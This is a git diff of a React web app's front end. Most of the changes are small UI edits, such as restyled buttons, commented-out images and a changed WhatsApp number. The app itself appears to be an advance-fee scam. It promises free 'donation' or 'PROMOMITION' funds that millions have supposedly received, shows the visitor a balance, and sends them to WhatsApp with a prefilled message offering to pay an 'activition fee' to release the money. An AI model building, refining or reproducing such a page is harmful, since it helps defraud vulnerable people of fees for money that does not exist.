@@ -275,14 +275,14 @@ export default function Prom() {
                   shughuli za kujenga uwezo.
                 </p>
               )}
-              {transacImg ? (
+              {/* {transacImg ? (
                 <>
                   hello
                   <img src="/transac.jpg" alt="pron" />
                 </>
               ) : (
                 <img src="/transac2.jpg" alt="pron" />
-              )}
+              )} */}
             </div>
             <div className="person">
               <>
@@ -312,18 +312,17 @@ export default function Prom() {
                 </p>
               )}
               <button
-                style={{ marginTop: "1rem" }}
+                style={{ marginTop: "2rem", padding: "1.4rem" }}
                 className="btn_apply"
                 onClick={handleSetHome}
               >
                 Apply Now
               </button>
-              <a
+              {/* <a
                 href="https://wa.me/message/HKUI4RPAQTKMH1"
                 className="whatsapp"
                 style={{ marginBottom: "2rem" }}
               >
-                {" "}
                 {blink ? (
                   <p style={{ backgroundColor: "inherit", color: "black" }}>
                     whatApp
@@ -331,7 +330,7 @@ export default function Prom() {
                 ) : (
                   <p style={{ backgroundColor: "inherit" }}>whatApp</p>
                 )}
-              </a>
+              </a> */}
             </div>
           </div>
         ) : (
@@ -473,11 +472,18 @@ function ChoosingOption({ home, onregister }) {
         <div className="home2">
           <p>Millions of People have already received This Funds</p>
           <span>Note that this Are not Loan they are Donations/Free</span>
-          <h5>Create or Login If You have an Account</h5>
+          <h5 style={{ marginBottom: "1rem" }}>
+            Create Account or Login If You have an Account
+          </h5>
           <button className="btn_apply" onClick={onregister}>
             Create Account
           </button>
-          <button className="btn_apply">Login to your Account</button>
+          <button
+            className="btn_apply"
+            style={{ backgroundColor: "rgba(190, 175, 175, 0.616)" }}
+          >
+            Login to your Account
+          </button>
         </div>
       ) : (
         ""
@@ -695,13 +701,11 @@ function ProfileCusto({ name, country, balance, currency }) {
         <div className="custoprof">
           {/* <div className="profilecusto">
             <ion-icon name="person-circle-outline"></ion-icon>
-          </div> */}
-          <h2>
-            {name}
             <span>
-              <ion-icon name="checkmark-circle-outline"></ion-icon>
-            </span>
-          </h2>
+            <ion-icon name="checkmark-circle-outline"></ion-icon>
+            </div> 
+            </span> */}
+          <h2>{name}</h2>
           <p className="countrye">Country: {country}.</p>
           <span>
             Balance:{" "}
@@ -727,7 +731,7 @@ function CongratsMessage({ balance, currency, custoName, activate }) {
     my PROMOMITION Funds of ${currency} ${balance}. I am ready to complete the process by paying the activition fee of ${currency} ${activate}.
      `);
 
-  const whatAppURL = `https://wa.me/+254736227246?text=${encodedmessge}`;
+  const whatAppURL = `https://wa.me/+254107545643?text=${encodedmessge}`;
   return (
     <div className="congra_message">
       <h2> Congratulations For Reaching the last Step</h2>
